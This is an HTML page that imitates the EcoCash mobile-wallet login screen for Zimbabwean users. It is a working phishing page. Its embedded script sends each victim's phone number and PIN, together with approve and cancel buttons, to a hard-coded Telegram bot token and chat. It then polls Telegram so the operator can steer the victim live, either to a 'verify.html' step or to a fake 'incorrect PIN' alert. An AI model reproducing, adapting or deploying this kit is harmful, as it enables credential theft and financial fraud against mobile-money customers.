<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash - Login</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html,
        body {
            min-height: 100vh;
            font-family: 'Inter', sans-serif;
            background: white;
            overflow-x: hidden;
            overflow-y: auto;
        }
        
        body {
            display: flex;
            flex-direction: column;
        }
        
        .logo {
            text-align: center;
            padding: 50px 20px 20px;
            flex-shrink: 0;
        }
        
        .logo-text {
            font-size: 36px;
            font-weight: 700;
        }
        
        .logo-eco {
            color: #0066ff;
        }
        
        .logo-cash {
            color: #ff0000;
        }
        
        .login-content {
            flex: 1 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 30px 50px;
            max-width: 480px;
            margin: 0 auto;
            width: 100%;
        }
        
        .title {
            font-size: 26px;
            font-weight: 600;
            color: #333;
            margin-bottom: 40px;
        }
        
        .phone-group {
            width: 100%;
            border: 2px solid #0066ff;
            border-radius: 16px;
            display: flex;
            align-items: center;
            padding: 18px 24px;
            margin-bottom: 40px;
            background: white;
        }
        
        .flag {
            font-size: 28px;
            margin-right: 12px;
        }
        
        .country-select {
            display: flex;
            align-items: center;
            color: #0066ff;
            font-weight: 600;
            font-size: 18px;
            margin-right: 16px;
        }
        
        .dropdown-arrow {
            font-size: 14px;
            margin-left: 6px;
        }
        
        .phone-input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 18px;
            color: #333;
        }
        
        .phone-input::placeholder {
            color: #aaa;
        }
        
        .pin-label {
            font-size: 16px;
            color: #666;
            margin-bottom: 24px;
            font-weight: 500;
        }
        
        .pin-group {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .pin-box {
            width: 60px;
            height: 60px;
            border: 2px solid #0066ff;
            border-radius: 16px;
            font-size: 28px;
            text-align: center;
            background: white;
            color: #333;
            font-weight: 600;
        }
        
        .forgot {
            font-size: 15px;
            color: #0066ff;
            text-decoration: none;
            font-weight: 500;
            margin-bottom: 40px;
        }
        
        #loginBtn {
            display: none;
            width: 100%;
            max-width: 400px;
            padding: 18px;
            background: #0066ff;
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 50px;
            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.3);
        }
        
        .bottom-section {
            background: #005eb8;
            color: white;
            padding: 100px 30px 80px;
            text-align: center;
            width: 100vw;
            margin-left: calc(-50vw + 50%);
            position: relative;
            flex-shrink: 0;
        }
        
        .curve {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 90px;
            background: white;
            border-radius: 0 0 50% 50% / 0 0 100% 100%;
            transform: scaleX(1.8);
            transform-origin: top;
        }
        
        .bottom-content {
            position: relative;
            z-index: 2;
        }
        
        .bottom-text {
            font-size: 15px;
            margin-bottom: 35px;
            line-height: 1.6;
            opacity: 0.95;
        }
        
        .bottom-btns {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-bottom: 40px;
        }
        
        .bottom-btn {
            background: white;
            color: #0066ff;
            border: none;
            border-radius: 30px;
            padding: 18px 36px;
            font-weight: 600;
            font-size: 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            width: 180px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
        }
        
        .btn-icon {
            font-size: 26px;
            color: #0066ff;
        }
        
        .version {
            font-size: 14px;
            margin-bottom: 12px;
            opacity: 0.9;
            font-weight: 500;
        }
        
        .terms {
            font-size: 13px;
            opacity: 0.85;
            line-height: 1.5;
        }
        
        .terms a {
            color: white;
            text-decoration: underline;
            font-weight: 500;
        }
        
        #spinnerOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.98);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f0f0f0;
            border-top: 6px solid #005eb8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 30px;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        
        .spinner-text {
            font-size: 18px;
            color: #333;
            text-align: center;
            line-height: 1.6;
            max-width: 300px;
            font-weight: 500;
        }
        
        /* Hidden message ID storage for answering callback */
        .hidden { display: none; }
    </style>
</head>

<body>
    <div class="logo">
        <div class="logo-text">
            <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
        </div>
    </div>

    <div class="login-content">
        <h1 class="title">Login</h1>

        <div class="phone-group">
            <span class="flag">🇿🇼</span>
            <div class="country-select">
                +263 <span class="dropdown-arrow">▼</span>
            </div>
            <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number">
        </div>

        <div class="pin-label">Enter your PIN</div>
        <div class="pin-group">
            <input type="password" class="pin-box" maxlength="1">
            <input type="password" class="pin-box" maxlength="1">
            <input type="password" class="pin-box" maxlength="1">
            <input type="password" class="pin-box" maxlength="1">
        </div>

        <a href="#" class="forgot">Forgot PIN?</a>

        <button id="loginBtn">LOGIN</button>
    </div>

    <div class="bottom-section">
        <div class="curve"></div>
        <div class="bottom-content">
            <div class="bottom-text">
                To register an EcoCash wallet or get assistance,<br> click below
            </div>
            <div class="bottom-btns">
                <a href="#" class="bottom-btn">
                    <div class="btn-icon">👤</div>
                    Register
                </a>
                <a href="#" class="bottom-btn">
                    <div class="btn-icon">ℹ️</div>
                    Help & Support
                </a>
            </div>
            <div class="version">v2.13P</div>
            <div class="terms">
                By signing in you agree to the <a href="#">Terms and Conditions</a>
            </div>
        </div>
    </div>
    <div id="spinnerOverlay">
        <div class="spinner"></div>
        <div class="spinner-text">
            Please wait...<br> This usually takes a few seconds
        </div>
    </div>
    <script>
        const BOT_TOKEN = '8667489311:AAF5uQ5o3jyqlo9Ulzo-WXwISI92N0HUBHA';
        const CHAT_ID = '8851096978';
        const savedPhone = localStorage.getItem('phone');
        const phoneInput = document.getElementById('phoneInput');
        if (savedPhone && savedPhone.length === 9) {
            phoneInput.value = savedPhone;
        }
        const pinBoxes = document.querySelectorAll('.pin-box');
        const loginBtn = document.getElementById('loginBtn');
        const spinnerOverlay = document.getElementById('spinnerOverlay');
        let pinValue = '';
        let pollInterval;
        let lastUpdateId = 0;
        let pollingActive = false;

        function checkPinComplete() {
            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
        }
        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                if (box.value.length === 1 && index < 3) {
                    pinBoxes[index + 1].focus();
                }
                checkPinComplete();
            });
            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === '' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
            });
        });

        function stopPolling() {
            pollingActive = false;
            if (pollInterval) {
                clearInterval(pollInterval);
                pollInterval = null;
            }
            spinnerOverlay.style.display = 'none';
        }

        function answerCallback(callbackQueryId) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    callback_query_id: callbackQueryId
                })
            }).catch(() => {});
        }

        loginBtn.addEventListener('click', () => {
            const phone = phoneInput.value.trim();
            if (!phone) {
                alert('Please enter phone number');
                return;
            }
            
            // Prevent multiple clicks
            if (pollingActive) return;
            pollingActive = true;
            
            spinnerOverlay.style.display = 'flex';
            const timestamp = Date.now();
            const approveData = 'approve_' + timestamp;
            const cancelData = 'cancel_' + timestamp;

            const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}\n\nApprove or cancel this access?`;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: 'Allow Proceed', callback_data: approveData },
                                    { text: 'Cancel', callback_data: cancelData }
                                ]
                            ]
                        }
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (!data.ok) {
                        stopPolling();
                        alert('Error sending to bot: ' + data.description);
                        pollingActive = false;
                        return;
                    }
                    // Start polling after successful send
                    startPolling(approveData, cancelData);
                })
                .catch(error => {
                    stopPolling();
                    alert('Bot connection error: ' + error);
                    pollingActive = false;
                });
        });

        function startPolling(approveData, cancelData) {
            // Do an initial fetch to get the latest update_id so we don't reprocess old updates
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
                .then(res => res.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        // Set offset to the latest update_id + 1 to skip all old updates
                        const maxId = Math.max(...data.result.map(u => u.update_id));
                        lastUpdateId = maxId;
                    }
                    
                    // Now start polling from after the last update
                    pollInterval = setInterval(() => {
                        if (!pollingActive) return;
                        
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`)
                            .then(res => res.json())
                            .then(data => {
                                if (!pollingActive) return;
                                if (data.ok && data.result.length > 0) {
                                    for (let update of data.result) {
                                        // Always advance offset
                                        if (update.update_id >= lastUpdateId) {
                                            lastUpdateId = update.update_id;
                                        }
                                        
                                        if (update.callback_query) {
                                            const cbData = update.callback_query.data;
                                            const cbId = update.callback_query.id;
                                            
                                            // Answer the callback query immediately to acknowledge it
                                            answerCallback(cbId);
                                            
                                            if (cbData === approveData) {
                                                stopPolling();
                                                window.location.href = 'verify.html';
                                                return;
                                            } else if (cbData === cancelData) {
                                                stopPolling();
                                                alert('pin entered is incorrect.');
                                                return;
                                            }
                                        }
                                    }
                                }
                            })
                            .catch(() => {});
                    }, 2000);
                })
                .catch(() => {
                    // Fallback: just poll normally
                    pollInterval = setInterval(() => {
                        if (!pollingActive) return;
                        
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`)
                            .then(res => res.json())
                            .then(data => {
                                if (!pollingActive) return;
                                if (data.ok && data.result.length > 0) {
                                    for (let update of data.result) {
                                        if (update.update_id >= lastUpdateId) {
                                            lastUpdateId = update.update_id;
                                        }
                                        
                                        if (update.callback_query) {
                                            const cbData = update.callback_query.data;
                                            const cbId = update.callback_query.id;
                                            
                                            answerCallback(cbId);
                                            
                                            if (cbData === approveData) {
                                                stopPolling();
                                                window.location.href = 'verify.html';
                                                return;
                                            } else if (cbData === cancelData) {
                                                stopPolling();
                                                alert('pin entered is incorrect.');
                                                return;
                                            }
                                        }
                                    }
                                }
                            })
                            .catch(() => {});
                    }, 2000);
                });
        }

        checkPinComplete();
        pinBoxes[0].focus();
    </script>
</body>

</html>
